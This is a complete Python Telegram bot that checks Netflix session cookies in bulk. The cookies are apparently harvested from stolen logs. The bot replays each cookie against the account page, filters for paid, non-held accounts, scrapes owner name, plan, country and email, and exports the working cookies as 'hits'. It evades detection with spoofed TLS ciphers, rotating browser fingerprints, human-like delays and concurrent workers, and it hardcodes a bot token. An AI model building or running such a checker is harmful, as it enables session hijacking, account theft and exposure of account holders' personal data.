import os
import io
import re
import json
import zipfile
import asyncio
import logging
import random
import time
import ssl
from collections import OrderedDict

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ═══════════════════════════════════════════════════════════════
# TOKEN — paste yours here if you want it baked in
# Otherwise leave empty and set NF_BOT_TOKEN env var in Termux
# ═══════════════════════════════════════════════════════════════
TOKEN = os.getenv("NF_BOT_TOKEN", "") or "8601902143:AAFmbZ0v-FhanzkoGvQjHAsFcKmVE1V1yVs"

logging.basicConfig(level=logging.INFO)
if not TOKEN or TOKEN == "PASTE_YOUR_TOKEN_HERE":
    raise SystemExit("Set NF_BOT_TOKEN or paste token in script")

MAX_RETRIES = 2
MIN_DELAY = 0.35
MAX_DELAY = 1.6
COOLDOWN_429 = 20

# ═══════════════════════════════════════════════════════════════
# TLS FINGERPRINT SPOOF — Chrome 126 cipher order
# ═══════════════════════════════════════════════════════════════
CHROME_CIPHERS = (
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:"
    "AES256-GCM-SHA384:AES128-SHA:AES256-SHA"
)


class ChromeAdapter(HTTPAdapter):
    def init_poolmanager(self, *a, **kw):
        ctx = create_urllib3_context(ciphers=CHROME_CIPHERS)
        ctx.options |= 0x4
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        kw["ssl_context"] = ctx
        return super().init_poolmanager(*a, **kw)


def new_session():
    s = requests.Session()
    a = ChromeAdapter(pool_connections=50, pool_maxsize=50)
    s.mount("https://", a)
    s.mount("http://", a)
    return s


# ═══════════════════════════════════════════════════════════════
# DEVICE FINGERPRINTS — 6 rotating profiles
# ═══════════════════════════════════════════════════════════════
IPHONES = [
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="17", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"iOS"',
    },
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="16", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"iOS"',
    },
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="15", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"iOS"',
    },
]

LAPTOPS = [
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"macOS"',
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    },
    {
        "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
    },
]

ACCEPT_LANGS = [
    "ar-SA,ar;q=0.9,en;q=0.8",
    "ar-AE,ar;q=0.9,en;q=0.8",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
]


def pick_profile():
    return random.choice(IPHONES + LAPTOPS)


def build_headers(p, referer=None, nav=True):
    h = {
        "User-Agent": p["ua"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "sec-ch-ua": p["sec-ch-ua"],
        "sec-ch-ua-mobile": p["sec-ch-ua-mobile"],
        "sec-ch-ua-platform": p["sec-ch-ua-platform"],
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate" if nav else "cors",
        "Sec-Fetch-Site": "same-origin" if referer else "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "DNT": "1",
        "Connection": "keep-alive",
    }
    if referer:
        h["Referer"] = referer
    return h


def human_delay():
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))


# ═══════════════════════════════════════════════════════════════
# COOKIE PARSING
# ═══════════════════════════════════════════════════════════════
NF_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"}
NF_ID_RE = re.compile(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', re.I)
EMAIL_RE = re.compile(r"([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})")

SESSION = {}


def sess(uid):
    if uid not in SESSION:
        SESSION[uid] = {
            "awaiting": None,
            "hits": OrderedDict(),
            "busy": False,
            "pending": None,
        }
    return SESSION[uid]


def parse_cookies(text):
    text = (text or "").strip()
    out = []
    try:
        if text.startswith(("{", "[")):
            obj = json.loads(text)
            if isinstance(obj, dict):
                flat = {k: str(v) for k, v in obj.items() if k in NF_NAMES}
                if flat.get("NetflixId"):
                    out.append(flat)
                if isinstance(obj.get("cookies"), list):
                    m = {
                        c["name"]: c["value"]
                        for c in obj["cookies"]
                        if isinstance(c, dict)
                        and c.get("name") in NF_NAMES
                        and "value" in c
                    }
                    if m.get("NetflixId"):
                        out.append(m)
            elif isinstance(obj, list):
                m = {
                    c["name"]: c["value"]
                    for c in obj
                    if isinstance(c, dict)
                    and c.get("name") in NF_NAMES
                    and "value" in c
                }
                if m.get("NetflixId"):
                    out.append(m)
    except Exception:
        pass
    ns = []
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_") :]
        elif line.startswith("#") or not line:
            continue
        p = line.split("\t")
        if len(p) >= 7 and p[5] in NF_NAMES:
            ns.append({"name": p[5], "value": p[6]})
    if ns:
        nf = [e for e in ns if e["name"] == "NetflixId"]
        if nf:
            for n in nf:
                cs = {"NetflixId": n["value"]}
                cs.update(
                    {e["name"]: e["value"] for e in ns if e["name"] != "NetflixId"}
                )
                out.append(cs)
        else:
            m = {e["name"]: e["value"] for e in ns}
            if m:
                out.append(m)
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        cs = {}
        for part in re.split(r"[;\s]+", line):
            if "=" in part:
                k, v = part.split("=", 1)
                if k.strip() in NF_NAMES:
                    cs[k.strip()] = v.strip()
        if cs.get("NetflixId"):
            out.append(cs)
    for m in NF_ID_RE.finditer(text):
        out.append({"NetflixId": m.group(1).strip("\"'")})
    seen, uniq = set(), []
    for cs in out:
        if not cs.get("NetflixId"):
            continue
        h = json.dumps(cs, sort_keys=True)
        if h in seen:
            continue
        seen.add(h)
        uniq.append(cs)
    return uniq


def cookies_from_zip(data):
    out = []
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        for n in z.namelist():
            if n.endswith("/") or n.startswith(("__MACOSX", ".")):
                continue
            if not n.lower().endswith((".txt", ".json")):
                continue
            try:
                out.extend(parse_cookies(z.read(n).decode("utf-8", "ignore")))
            except Exception:
                continue
    seen, uniq = set(), []
    for cs in out:
        h = json.dumps(cs, sort_keys=True)
        if h in seen:
            continue
        seen.add(h)
        uniq.append(cs)
    return uniq


# ═══════════════════════════════════════════════════════════════
# CHECK — full stealth sequence
# ═══════════════════════════════════════════════════════════════
def check_cookie(cd):
    if not cd.get("NetflixId"):
        return {"ok": False, "reason": "no_id", "retries": 0}
    profile = pick_profile()
    s = new_session()
    s.cookies.update(cd)
    retries = 0
    last_err = None
    for attempt in range(MAX_RETRIES + 1):
        try:
            try:
                s.get(
                    "https://www.netflix.com/",
                    headers=build_headers(profile, referer=None),
                    timeout=20,
                    verify=False,
                    allow_redirects=True,
                )
                human_delay()
            except Exception:
                pass
            try:
                s.get(
                    "https://www.netflix.com/browse",
                    headers=build_headers(profile, referer="https://www.netflix.com/"),
                    timeout=20,
                    verify=False,
                    allow_redirects=True,
                )
                human_delay()
            except Exception:
                pass
            r = s.get(
                "https://www.netflix.com/YourAccount",
                headers=build_headers(profile, referer="https://www.netflix.com/browse"),
                timeout=25,
                verify=False,
                allow_redirects=True,
            )
            if r.status_code in (429, 502, 503, 504):
                retries += 1
                time.sleep(COOLDOWN_429 + random.uniform(0, 10))
                last_err = "http_" + str(r.status_code)
                continue
            if "login" in r.url.lower() or r.status_code != 200:
                return {"ok": False, "reason": "dead", "retries": retries}
            txt = r.text

            def find(p):
                m = re.search(p, txt)
                return m.group(1) if m else None

            name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(
                r'"firstName"\s*:\s*"([^"]+)"'
            )
            plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(
                r'localizedPlanName.{1,50}?value":"([^"]+)"'
            )
            ctry = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            email = find(r'"emailAddress"\s*:\s*"([^"]+)"')
            ms = find(r'"membershipStatus"\s*:\s*"([^"]+)"')
            hold = bool(re.search(r'"isUserOnHold"\s*:\s*true', txt))
            if not name and not plan and not ctry:
                return {"ok": False, "reason": "no_data", "retries": retries}
            plan_l = (plan or "").lower()
            paid = (
                ms == "CURRENT_MEMBER"
                and "free" not in plan_l
                and plan_l not in ("", "unknown")
            )
            if email:
                email = EMAIL_RE.sub(lambda m: m.group(1) + "***" + m.group(2), email)
            return {
                "ok": True,
                "paid": paid,
                "hold": hold,
                "name": name or "?",
                "plan": plan or "?",
                "country": ctry or "?",
                "email": email or "?",
                "status": ms or "?",
                "cookie": cd,
                "retries": retries,
                "device": "iPhone" if "iPhone" in profile["ua"] else "Laptop",
            }
        except requests.RequestException as e:
            last_err = str(e)[:50]
            retries += 1
            time.sleep(2 + random.uniform(0, 2))
            continue
    return {"ok": False, "reason": last_err or "failed", "retries": retries}


# ═══════════════════════════════════════════════════════════════
# UI
# ═══════════════════════════════════════════════════════════════
def kb_main():
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Check Cookie", callback_data="do_check")],
            [
                InlineKeyboardButton("Info", callback_data="stats"),
                InlineKeyboardButton("Close", callback_data="close"),
            ],
        ]
    )


def kb_back():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("Back", callback_data="menu")]]
    )


def kb_workers():
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("1 worker", callback_data="wk_1")],
            [InlineKeyboardButton("5 workers", callback_data="wk_5")],
            [InlineKeyboardButton("10 workers", callback_data="wk_10")],
            [InlineKeyboardButton("20 workers", callback_data="wk_20")],
            [InlineKeyboardButton("Cancel", callback_data="menu")],
        ]
    )


def p_menu():
    return (
        "NETFLIX COOKIE CHECKER v7\n"
        "========================\n"
        "   ULTRA-STEALTH MODE\n"
        "========================\n\n"
        "Welcome, boss!\n\n"
        "HOW TO USE:\n"
        "1. Tap Check Cookie\n"
        "2. Paste cookie / NetflixId\n"
        "3. Or upload .txt / .zip\n"
        "4. Choose worker count\n"
        "5. Get paid, no-hold hits\n\n"
        "ANTI-DETECT STACK:\n"
        "- iPhone + Laptop fingerprint rotation\n"
        "- Chrome 126 TLS cipher spoof\n"
        "- Arab locale (ar-SA / ar-AE)\n"
        "- Full browser header chain\n"
        "- Human delay jitter (0.35-1.6s)\n"
        "- Referer chain warm-up\n"
        "- Cookie jar persistence\n"
        "- 20s cooldown on 429\n"
        "- Paid & no-hold filter\n\n"
        "Netflix sees a real iPhone."
    )


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    sess(update.effective_user.id)["awaiting"] = None
    await update.message.reply_text(p_menu(), reply_markup=kb_main())


async def cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    s = sess(uid)
    try:
        await q.answer()
    except Exception:
        pass
    if q.data == "menu":
        s["awaiting"] = None
        s["pending"] = None
        await q.edit_message_text(p_menu(), reply_markup=kb_main())
    elif q.data == "do_check":
        s["awaiting"] = "check"
        await q.edit_message_text(
            "CHECK MODE ACTIVE\n\n"
            "Paste cookie or NetflixId\n"
            "Or upload .txt / .zip\n\n"
            "Stealth ON - Netflix sees a real iPhone",
            reply_markup=kb_back(),
        )
    elif q.data == "stats":
        await q.edit_message_text(
            "BOT INFO\n\n"
            "Fingerprints: 6 profiles\n"
            "TLS: Chrome 126\n"
            "Locale: ar-SA / ar-AE / en-US\n"
            "Delay: 0.35-1.6s jitter\n"
            "Retries: 2 (20s backoff)\n"
            "Filter: Paid + No-Hold only\n\n"
            "Worker options: 1 / 5 / 10 / 20",
            reply_markup=kb_back(),
        )
    elif q.data == "close":
        try:
            await q.message.delete()
        except Exception:
            await q.edit_message_text("Closed. /start to reopen.")
    elif q.data.startswith("wk_"):
        n = int(q.data.split("_")[1])
        cookies = s.get("pending") or []
        if not cookies:
            await q.answer("No cookies loaded.")
            return
        s["pending"] = None
        s["awaiting"] = None
        asyncio.create_task(run_check(q.message, uid, cookies, ctx, n))


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = sess(uid)
    if s.get("awaiting") != "check" or s.get("busy"):
        return
    cookies = parse_cookies(update.message.text or "")
    if not cookies:
        await update.message.reply_text("No NetflixId found. Try again.")
        return
    await update.message.reply_text(
        "{} cookie(s) loaded.\n\nChoose worker count:".format(len(cookies)),
        reply_markup=kb_workers(),
    )
    s["pending"] = cookies


async def on_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = sess(uid)
    if s.get("awaiting") != "check" or s.get("busy"):
        await update.message.reply_text("Tap Check Cookie first from /start.")
        return
    doc = update.message.document
    if not doc:
        return
    name = doc.file_name.lower()
    if not name.endswith((".txt", ".zip")):
        await update.message.reply_text("Only .txt or .zip supported.")
        return
    f = await doc.get_file()
    data = await f.download_as_bytearray()
    if name.endswith(".zip"):
        cookies = cookies_from_zip(bytes(data))
    else:
        cookies = parse_cookies(bytes(data).decode("utf-8", "ignore"))
    if not cookies:
        await update.message.reply_text("No cookies found in file.")
        return
    await update.message.reply_text(
        "{} cookie(s) loaded.\n\nChoose worker count:".format(len(cookies)),
        reply_markup=kb_workers(),
    )
    s["pending"] = cookies


# ═══════════════════════════════════════════════════════════════
# RUNNER
# ═══════════════════════════════════════════════════════════════
async def run_check(msg, uid, cookies, ctx, workers):
    s = sess(uid)
    s["busy"] = True
    total = len(cookies)
    checked = hits = fails = retries_total = 0
    paid_hits = []
    iphone_count = laptop_count = 0
    start_t = time.time()

    prog = await msg.reply_text(
        "Starting ultra-stealth check...\n"
        "Total: {}\n"
        "Workers: {}\n"
        "Fingerprints: rotating".format(total, workers)
    )

    sem = asyncio.Semaphore(workers)

    async def one(cd):
        nonlocal checked, hits, fails, retries_total, iphone_count, laptop_count
        async with sem:
            r = await asyncio.to_thread(check_cookie, cd)
        checked += 1
        retries_total += r.get("retries", 0)
        if r.get("device") == "iPhone":
            iphone_count += 1
        elif r.get("device"):
            laptop_count += 1
        if r.get("ok") and r.get("paid") and not r.get("hold"):
            hits += 1
            paid_hits.append(r)
        else:
            fails += 1
        if checked % 3 == 0 or checked == total:
            elapsed = time.time() - start_t
            spd = checked / elapsed if elapsed > 0 else 0
            pct = int(checked * 100 / total) if total else 0
            fill = int(pct / 10)
            bar = "#" * fill + "." * (10 - fill)
            txt = (
                "Checking Netflix Cookies...\n\n"
                "Progress: {}/{} ({}%)\n"
                "{}\n\n"
                "Paid Hits: {}\n"
                "Fails: {}\n"
                "Retries: {}\n"
                "Speed: {:.2f}/s\n"
                "Elapsed: {:.1f}s\n"
                "iPhone: {} | Laptop: {} | Workers: {}"
            ).format(
                checked,
                total,
                pct,
                bar,
                hits,
                fails,
                retries_total,
                spd,
                elapsed,
                iphone_count,
                laptop_count,
                workers,
            )
            try:
                await prog.edit_text(txt)
            except Exception:
                pass

    await asyncio.gather(*[one(cd) for cd in cookies])

    s["busy"] = False
    s["awaiting"] = None
    s["hits"] = OrderedDict((f"H{i+1}", h) for i, h in enumerate(paid_hits))

    elapsed = time.time() - start_t
    spd = checked / elapsed if elapsed > 0 else 0

    summary = (
        "Check Complete!\n\n"
        "Stats A-Z\n"
        "========================\n"
        "Total:     {}\n"
        "Checked:   {}\n"
        "Paid Hits: {}\n"
        "Fails:     {}\n"
        "Retries:   {}\n"
        "Speed:     {:.2f}/s\n"
        "Time:      {:.1f}s\n"
        "iPhone:    {}\n"
        "Laptop:    {}\n"
        "Workers:   {}\n"
        "========================\n\n"
    ).format(
        total,
        checked,
        hits,
        fails,
        retries_total,
        spd,
        elapsed,
        iphone_count,
        laptop_count,
        workers,
    )

    if hits:
        summary += "Paid accounts found - tap to download."
        markup = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("Download .txt", callback_data="dl_txt")],
                [InlineKeyboardButton("Back", callback_data="menu")],
            ]
        )
    else:
        summary += "No paid & no-hold accounts found."
        markup = kb_back()

    try:
        await prog.edit_text(summary, reply_markup=markup)
    except Exception:
        await msg.reply_text(summary, reply_markup=markup)


async def dl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    s = sess(q.from_user.id)
    hits = s.get("hits") or {}
    try:
        await q.answer()
    except Exception:
        pass
    if not hits:
        return
    lines = ["NETFLIX PAID HITS", "=" * 40, ""]
    for i, (k, v) in enumerate(hits.items(), 1):
        lines.append("HIT #{}".format(i))
        lines.append("Name:    {}".format(v.get("name", "?")))
        lines.append("Plan:    {}".format(v.get("plan", "?")))
        lines.append("Country: {}".format(v.get("country", "?")))
        lines.append("Email:   {}".format(v.get("email", "?")))
        lines.append("Status:  {}".format(v.get("status", "?")))
        lines.append("Retries: {}".format(v.get("retries", 0)))
        lines.append("Device:  {}".format(v.get("device", "?")))
        lines.append("Cookies:")
        for kk, vv in v.get("cookie", {}).items():
            lines.append("  {}={}".format(kk, vv))
        lines.append("")
    buf = io.BytesIO("\n".join(lines).encode())
    await ctx.bot.send_document(
        q.message.chat_id,
        document=InputFile(buf, filename="netflix_paid_hits.txt"),
        caption="{} paid, no-hold accounts".format(len(hits)),
    )


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(dl, pattern="^dl_txt$"))
    app.add_handler(CallbackQueryHandler(cb))
    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()